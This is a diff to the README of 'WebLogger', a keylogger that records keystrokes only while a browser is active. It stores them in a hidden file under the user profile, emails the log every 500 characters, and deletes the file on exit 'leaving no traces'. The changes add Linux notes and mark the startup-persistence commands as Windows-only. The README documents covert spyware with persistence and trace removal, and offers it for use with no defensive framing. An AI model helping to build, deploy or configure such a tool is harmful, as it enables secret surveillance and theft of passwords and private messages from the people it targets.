@@ -1,7 +1,7 @@
 # WebLogger
 
 Weblogger is a keylogger that only records keystrokes when a browser is open and active. 
-Weblogger saves a hidden log file in the %USERPROFILE% directory, and when it hits 
+Weblogger saves a hidden log file in the %USERPROFILE% directory (HOME in linux), and when it hits 
 MAX_DATA_LEN (default: 500 chars), an email is sent with the current log.
 When Weblogger stops, an email is sent with the current log and the log file is deleted leaving no traces.
 
@@ -30,11 +30,11 @@ weblogger.exe
 
 Open a browser and type 'webloggerkill' (without quotation marks)
 
-* ### Add Weblogger To Startup
+* ### Add Weblogger To Startup (windows only)
 
 Open a browser and type 'webloggerstartup' (without quotation marks)
 
-* ### Remove Weblogger From Startup
+* ### Remove Weblogger From Startup (windows only)
 
 Open a browser and type 'webloggernostartup' (without quotation marks)
 
